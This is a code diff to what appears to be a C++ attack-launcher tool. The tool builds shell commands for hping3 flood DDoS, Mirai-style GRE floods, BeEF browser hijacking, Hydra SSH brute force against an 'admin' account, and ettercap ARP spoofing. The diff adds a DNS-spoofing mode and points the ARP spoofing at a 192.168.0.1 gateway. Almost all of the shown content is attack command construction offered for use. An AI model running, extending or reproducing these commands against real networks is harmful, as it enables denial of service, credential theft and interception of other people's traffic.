@@ -16,6 +16,8 @@ std::mutex cout_mutex;
 std::string generate_command(AttackType type, std::string target, int duration) {
     std::string hping_base = "timeout " + std::to_string(duration) + "s hping3 --flood ";
     std::string nmap_base = "timeout " + std::to_string(duration) + "s nmap ";
+    std::string hydra_base = "timeout " + std::to_string(duration) + "s hydra";
+    std::string ettercap_base="timeout " + std::to_string(duration) + "s ettercap ";
 
     switch (type) {
         // DDoS
@@ -54,10 +56,13 @@ std::string generate_command(AttackType type, std::string target, int duration) 
         case AttackType::WEB_BROWSER_HIJACKING: return "./beef_attack " + target; // Beef[58]
         
         // Brute Force
-        case AttackType::BRUTE_DICTIONARY: return "hydra -l admin -P passlist.txt " + target + " ssh";
+        case AttackType::BRUTE_DICTIONARY: return hydra_base +" -l admin -P password.txt " + target + " ssh";
 
         // Spoofing
-        case AttackType::SPOOF_ARP: return "ettercap -T -M arp /" + target + "// /" + target + "//";
+        case AttackType::SPOOF_ARP: return ettercap_base + "-T -q -i eth0 -M arp:remote /192.168.0.1// /" + target + "//";
+        case AttackType::SPOOF_DNS: return ettercap_base + "-T -q -i eth0 -M arp:remote /"+ target+"// /192.168.0.1// -P dns_spoof";
+
+
 
         // Mirai (Adapted)
         case AttackType::MIRAI_GREIP_FLOOD: return "./mirai_flood greip " + target + " " + std::to_string(duration);
@@ -217,9 +222,10 @@ int main() {
         std::cin >> type_choice;
         selected = AttackType::BRUTE_DICTIONARY;
     } else if (cat_choice == 6) { // Spoofing
-        std::cout << "1. ARP Spoofing\nSelect Spoofing Type: ";
+        std::cout << "1. ARP Spoofing\n2. DNS Spoofing\nSelect Spoofing Type: ";
         std::cin >> type_choice;
         if (type_choice == 1) selected = AttackType::SPOOF_ARP;
+        else if (type_choice == 2) selected = AttackType::SPOOF_DNS;
         else selected = AttackType::SPOOF_ARP;
     } else if (cat_choice == 7) { // Mirai
         selected = AttackType::MIRAI_GREIP_FLOOD;
